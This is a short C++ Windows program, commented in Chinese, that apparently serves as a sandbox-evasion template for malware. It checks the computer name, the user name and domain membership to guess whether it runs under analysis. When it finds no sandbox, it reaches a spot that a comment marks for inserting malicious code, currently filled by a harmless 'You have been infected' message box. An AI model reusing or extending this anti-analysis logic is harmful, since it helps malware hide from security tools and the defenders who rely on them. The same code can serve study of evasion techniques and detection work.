#include <windows.h>
#include <stdio.h>
#include <Lm.h>
#include <Lmcons.h>

#pragma comment(lib, "Netapi32.lib")

// 检查计算机名称
bool CheckComputerName() {
    DWORD computerNameLength = MAX_COMPUTERNAME_LENGTH + 1;
    wchar_t computerName[MAX_COMPUTERNAME_LENGTH + 1];

    if (GetComputerNameW(computerName, &computerNameLength)) {
        CharUpperW(computerName);
        if (wcsstr(computerName, L"DESKTOP-")) {
            return true;  // 可能是沙箱
        }
    }
    return false;
}

// 检查用户名
bool CheckUserName() {
    DWORD userNameLength = UNLEN + 1;
    wchar_t userName[UNLEN + 1];

    if (GetUserNameW(userName, &userNameLength)) {
        CharUpperW(userName);
        if (wcsstr(userName, L"ADMIN")) {
            return true;  // 可能是沙箱
        }
    }
    return false;
}

// 检查是否在域环境中
bool IsInDomain() {
    NETSETUP_JOIN_STATUS joinStatus;
    if (NetGetJoinInformation(NULL, NULL, &joinStatus) == NERR_Success) {
        if (joinStatus == NetSetupDomainName) {
            return true;  // 计算机在域环境中
        }
    }
    return false;  // 计算机不在域环境中
}

int main() {
    // 如果计算机名或用户名匹配条件，或者不在域环境中，则认为是沙箱
    if (CheckComputerName() || CheckUserName() || !IsInDomain()) {
        printf("Running inside a sandbox.\n");
    }
    else {
        printf("Not running inside a sandbox.\n");
        // 这里插入恶意代码，比如显示一个弹窗消息
        MessageBoxA(NULL, "You have been infected by a malware!", "Malware Alert", MB_OK | MB_ICONWARNING);
    }
    return 0;
}
